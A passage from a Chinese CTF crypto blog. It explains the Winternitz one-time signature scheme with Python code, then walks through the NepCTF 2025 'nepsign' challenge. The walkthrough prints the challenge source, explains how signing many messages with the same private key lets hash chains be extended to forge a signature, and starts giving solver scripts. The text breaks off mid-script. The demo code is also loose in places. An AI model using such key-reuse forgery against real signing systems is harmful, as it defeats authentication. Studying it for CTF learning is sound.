id="密钥生成">密钥生成</h2><p><strong>确定同时签名的位数</strong>：首先需要先选取一个$\omega\ge2$，$\omega$表示要<strong>同时签名的位数</strong>，并且还控制着公钥的<strong>哈希次数</strong>。</p><ul><li>这里例举一个例子帮助理解：比如：要签名<code>a-&gt;01100001</code>，如果选取$w=2$，那么签名的时候对于<code>a-&gt;01100001</code>就会将它的二进制位，按照俩个一组进行组合，将组合后的数据进行哈希计算<code>h(01)、h(10)、h(00)、h(01)</code>。</li><li>注意：一般来说$\omega=8$，因为<code>8</code>位是一个字节刚好可以一个字节同时进行数字签名。</li></ul><p><strong>选取一个哈希函数</strong>：确定哈希函数的消息摘要长度是<code>256</code>位，还是<code>128</code>位将会影响后续公钥和私钥的长度。这边选取目前最常用的<code>sha2-256</code>。即哈希摘要长度为<code>256</code>位，转换为字节数就是<code>32</code>字节。</p><p><strong>私钥的选取</strong>：要确定私钥的个数，私钥的大小。</p><ul><li><p>私钥的个数由俩个部分组成：</p><ul><li><p>第一个部分$t_1$：由同时签名的位数$\omega$与哈希函数的消息摘要长度决定，即哈希摘要的位数$256/\omega$，这里$t_1=32$</p></li><li><p>第二个部分$t_2$：由同时签名的位数$\omega$与后面校验和的长度决定，根据下面的校验和长度，选择$t_2=2$</p></li></ul></li><li><p>私钥的生成的大小其实就是在$x_i\in[0,2^{256}),i=1,2,…,t-1$这个范围内，而这个<code>256</code>其实就是选取哈希函数消息摘要的位数。这样就形成了一个私钥。</p></li></ul><p>$$<br>Sk=(x_{t-1},…,x_1,x_0),t=t_1+t_2<br>$$</p><p><strong>公钥的计算</strong>：公钥的计算其实比较简单，就是将私钥进行一定次数的哈希计算，形成哈希链。而哈希的次数是由$\omega$决定的。<br>$$<br>y_i=h^{2^{\omega}-1}(x_i)=h^{256}(x_i),0\le i \le t-1\<br>Pk=(y_{t-1},…,y_1,y_0)<br>$$</p><ul><li>由于$\omega=8$，哈希的次数为<code>255</code>，哈希的次数比较合适（太多会导致运算时间太高，太少导致容易被破解）。</li></ul><h2 id="签名">签名</h2><ul><li>假设消息是<code>m</code>，首先需要通过一次哈希，将消息<code>m</code>映射到固定的长度，这里选取<code>sha2-256</code>，所以消息<code>m</code>会被映射成<code>256</code>位。接下来就需要对这个<code>256</code>位的哈希值进行分组操作，将这个<code>256</code>位的哈希值分成$\omega$位一组，这里也就是<code>8</code>位一组。</li></ul><p>$$<br>h(m) = b_{t_1-1}||…||b_0<br>$$</p><ul><li>接下来需要对分组的$b_i$计算一个校验和，具体的计算方式如下：</li></ul><p>$$<br>c = \sum_{i=0}^{t_1-1}(2^{\omega}-b_i)<br>$$</p><ul><li>求得校验和<code>c</code>后，需要将<code>c</code>转换为比特串，将转换成的比特串继续按照$\omega$位一组进行分组，一共可以分得$t_2$组，而这个$t_2$就是前面私钥的个数$t=t_1+t_2$中的$t_2$，而通过计算这里的$t_2=2$</li></ul><p>$$<br>c=b_{t_2-1}||…||b_0<br>$$</p><ul><li>这里将<code>h(m)</code>和<code>c</code>组合起来得到<code>d</code>：</li></ul><p>$$<br>d=c||h(m)=d_{t-1}||…||d_{t-t_2-1}||…d_0<br>$$</p><ul><li>最终就需要对消息的哈希值与校验和进行签名得到最终的签名<code>V</code>，最坏的情况需要执行$2^{\omega-1}$次的哈希函数运算：</li></ul><p>$$<br>v_i =h^{d_i}(sk_i),i=0,1,…,t-1\<br>V = (v_{t-1},…,t_1,t_0)<br>$$</p><h2 id="验签算法">验签算法</h2><ul><li>验证签名的运算其实就是将哈希链的计算次数达到<code>255</code>次并判断是否与公钥相等。也就是先进行哈希函数的运算：</li></ul><p>$$<br>v’<em>i = h^{255-d_i}(v_i)\<br>V’=(v’</em>{t-1},…,v’_{1},v’_0)<br>$$</p><ul><li>最后判断$pk_i$是否与$v’_i$相等，如果存在有一个数据不相等就说明签名验证不成功，说明消息或者某些数据被更改了。</li></ul><p>注意：这是一次性数字签名方案，说明如果重复使用同一个私钥对不同消息进行数字签名，很可能就能伪造数字签名了。所以一次性数字签名在可能会存在<strong>重复使用私钥的情况</strong>。</p><h2 id="代码实现">代码实现</h2><ul><li>实现的代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 使用sha2-256进行哈希链的计算</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_chain</span>(<span class="params">m,x</span>):</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        t = sha256(t).digest()</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建公钥和私钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>():</span><br><span class="line">    omega,t1,t2 = <span class="number">8</span>, <span class="number">32</span>, <span class="number">2</span></span><br><span class="line">    sk = [random.randint(<span class="number">0</span>,<span class="number">2</span>**(omega * <span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t1+t2)] <span class="comment"># 生成私钥</span></span><br><span class="line">    pk = [hash_chain(long_to_bytes(m),<span class="number">255</span>) <span class="keyword">for</span> m <span class="keyword">in</span> sk] <span class="comment"># 生成公钥</span></span><br><span class="line">    <span class="keyword">return</span> sk,pk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行签名操作m表示需要签名的消息,sk表示用于签名的私钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">m,sk</span>):</span><br><span class="line">    <span class="comment"># 计算消息的哈希值</span></span><br><span class="line">    m_ = sha256(m).digest()</span><br><span class="line">    <span class="comment"># V用于存储签名的结果</span></span><br><span class="line">    V = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 签名消息</span></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(m_):</span><br><span class="line">        V.append(hash_chain(long_to_bytes(sk[index]),item))</span><br><span class="line">    sigma = long_to_bytes(<span class="built_in">sum</span>(<span class="built_in">list</span>(m_)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 签名校验和</span></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(sigma):</span><br><span class="line">        V.append(hash_chain(long_to_bytes(sk[index+<span class="number">32</span>]),item))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> V</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行数字签名的验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">m,V,pk</span>):</span><br><span class="line">    m_ = sha256(m).digest()</span><br><span class="line">    V_ = []</span><br><span class="line">    <span class="comment"># 计算剩余的哈希链</span></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(m_):</span><br><span class="line">        V_.append(hash_chain(V[index],<span class="number">255</span>-item))</span><br><span class="line"></span><br><span class="line">    c = long_to_bytes(<span class="built_in">sum</span>(<span class="built_in">list</span>(m_)))</span><br><span class="line">    <span class="comment"># 计算校验和部分的剩余哈希链</span></span><br><span class="line">    <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        V_.append(hash_chain(V[index+<span class="number">32</span>],<span class="number">255</span>-item))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断计算出来的哈希链是否与公钥pk相等</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(V_)):</span><br><span class="line">        <span class="keyword">if</span> pk[i] != V_[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sk, pk = key_gen()</span><br><span class="line">    m = <span class="string">b&#x27;AAAA&#x27;</span></span><br><span class="line">    V = sign(m,sk)</span><br><span class="line">    <span class="comment"># 当 m 没被修改时进行认证</span></span><br><span class="line">    result = verify(m,V,pk)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;m没被修改=<span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 当 m 被修改过时进行认证</span></span><br><span class="line">    result2 = verify(<span class="string">b&#x27;AAA&#x27;</span>,V,pk)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;m被修改过进行认证=<span class="subst">&#123;result2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="例题-nepctf2025_nepsign">例题-nepctf2025_nepsign</h1><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag = os.environ[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  </span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="comment"># SM3和SM3_n是一块的,实现的就是哈希值计算,所以此题使用的就是SM3作为哈希函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Nepsign</span>():</span><br><span class="line">    <span class="comment"># 构造方法, 初始化n = 256 , hex_symbols = &#x27;012....&#x27; ,调用keygen函数</span></span><br><span class="line">    <span class="comment"># 从sign()函数中可以看出,omega = 8</span></span><br><span class="line">    <span class="comment"># 从公钥的生成可以看出哈希链也是哈希了255次</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): </span><br><span class="line">        self.n = <span class="number">256</span></span><br><span class="line">        self.hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">        self.keygen()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密钥生成方式类似于WOTS(Winternitz one-time signature scheme)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">self</span>): </span><br><span class="line">        rng = SystemRandom()   </span><br><span class="line">        self.sk = [rng.randbytes(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]   <span class="comment"># 生成私钥sk,生成48组</span></span><br><span class="line">        self.pk = [SM3_n(self.sk[_], <span class="number">255</span>, self.n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)] <span class="comment"># 生成公钥pk,生成48组</span></span><br><span class="line">        <span class="keyword">return</span> self.sk, self.pk <span class="comment"># 返回数据及其哈希值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, sk=<span class="literal">None</span></span>): <span class="comment"># 签名操作</span></span><br><span class="line">        sk = sk <span class="keyword">if</span> sk <span class="keyword">else</span> self.sk  <span class="comment"># 获取私钥</span></span><br><span class="line">        m = SM3(msg) <span class="comment"># 计算消息msg的哈希值,结果为m</span></span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>) <span class="comment"># 将哈希值转换为二进制比特填充,填充到256位</span></span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)] <span class="comment"># 8位一组,8位一组的取出来</span></span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span> <span class="comment"># 初始化,保存a数组的值</span></span><br><span class="line">        qq = [<span class="number">0</span>] * <span class="number">48</span> <span class="comment"># 初始化,保存hash值</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):<span class="comment"># 计算哈希链,哈希次数为step[i],哈希的数据为sk[i]</span></span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            qq[i] = SM3_n(sk[i], step[i]) </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 这里相当于自定义了一个校验和,这个校验和是统计m消息的哈希值的16进制字符表示中0~f的索引和</span></span><br><span class="line">        <span class="comment"># 比如m[0]=&#x27;0&#x27;,m[16]=&#x27;0&#x27;,那么sum[0] = 0 + 16</span></span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]: </span><br><span class="line">                    <span class="built_in">sum</span>[i] += j     </span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span>  <span class="comment"># 将sum[i]模上255</span></span><br><span class="line">            qq[i + <span class="number">32</span>] = SM3_n(sk[i + <span class="number">32</span>], step[i + <span class="number">32</span>]) <span class="comment"># 计算校验和部分的哈希链</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> qq] <span class="comment"># 相当于返回qq列表,qq列表长度为</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, qq, pk=<span class="literal">None</span></span>): <span class="comment"># 验证过程</span></span><br><span class="line">        qq = [<span class="built_in">bytes</span>.fromhex(i) <span class="keyword">for</span> i <span class="keyword">in</span> qq] <span class="comment">#</span></span><br><span class="line">        pk = pk <span class="keyword">if</span> pk <span class="keyword">else</span> self.pk</span><br><span class="line">        m = SM3(msg)</span><br><span class="line">        m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">        a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n // <span class="number">8</span>)]</span><br><span class="line">        step = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        pk_ = [<span class="number">0</span>] * <span class="number">48</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            step[i] = a[i]</span><br><span class="line">            pk_[i] = SM3_n(qq[i], <span class="number">255</span> - step[i]) <span class="comment"># 关键点一共会进行255次哈希,抓住这一点去伪造qq</span></span><br><span class="line">        <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">                <span class="keyword">if</span> m[j - <span class="number">1</span>] == self.hex_symbols[i]:</span><br><span class="line">                    <span class="built_in">sum</span>[i] += j</span><br><span class="line">            step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">            pk_[i + <span class="number">32</span>] = SM3_n(qq[i + <span class="number">32</span>], <span class="number">255</span> - step[i + <span class="number">32</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> pk_ == pk <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;initializing...&#x27;</span>)</span><br><span class="line">Sign = Nepsign()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)): <span class="comment"># 提供俩个选项</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment"># 选项1是输入消息,消息不等于happy for NepCTF 2025就会对输入的消息进行签名,但是这里存在一个私钥复用的漏洞点,通过特殊构造其实就可以得到qq列表</span></span><br><span class="line">            msg = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;msg: &#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> msg != <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(Sign.sign(msg))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t do that&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            qq = literal_eval(<span class="built_in">input</span>(<span class="string">&#x27;give me a qq: &#x27;</span>)) <span class="comment"># 输入qq使得使得qq满足对happy for NepCTF 2025这个消息的签名</span></span><br><span class="line">            <span class="keyword">if</span> Sign.verify(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq):</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>通过解读代码其实就发现本题其实可以得到，最关键的利用点就是要想办法获取消息<code>b'happy for NepCTF 2025'</code>，签名过后的<code>qq</code>数组。</li><li>其实使用题目中现成的函数，可以得到消息<code>b'happy for NepCTF 2025'</code>的哈希值以及校验和的具体值,也就是上面代码中的<code>step</code>的值，而<code>step</code>的值代表着私钥哈希的次数。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  <span class="comment"># 应该是计算一个hash值</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"><span class="comment"># 首先计算出对消息b&#x27;happy for NepCTF 2025&#x27;来说,它的step的状态</span></span><br><span class="line">msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_step</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3_n(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    step = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> // <span class="number">8</span>)]</span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:  <span class="comment"># 如果消息的哈希值对应索引符合hex_symbols中的某一个</span></span><br><span class="line">                <span class="built_in">sum</span>[i] += j  <span class="comment"># sum就会加上索引</span></span><br><span class="line">        step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">step_des = c_step(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(step_des)</span><br></pre></td></tr></table></figure><p><img src="/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/image-20250901222946617.png" alt="image-20250901222946617"></p><ul><li><p>通过观察代码就会发现，每次使用选择<code>1</code>的签名操作时，都使用的是同一个私钥进行签名，由于消息<code>b'happy for NepCTF 2025'</code>的<code>step</code>值是已知的。所以我们只要发送特殊的消息，使得该消息的<code>step1[i]&lt;=step[i]</code></p><ul><li>当<code>step1[i]&lt;step[i]</code>的时候，其实可以使用返回的<code>qq1[i]</code>，继续哈希<code>step[i]-step1[i]</code>次就能得到消息<code>b'happy for NepCTF 2025'</code>对应的<code>qq[i]</code>的值</li><li>当<code>step1[i]=step[i]</code>的时候，<code>qq1[i]==qq[i]</code></li><li>这样通过有限次的对不同的特殊消息进行签名，就可以得到<code>pp</code>这个列表的值。</li></ul></li><li><p>接下来使用下面这一串代码可以生成符合要求的消息，也就是满足<code>step1[i]&lt;=step[i]</code>的消息。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  <span class="comment"># 应该是计算一个hash值</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 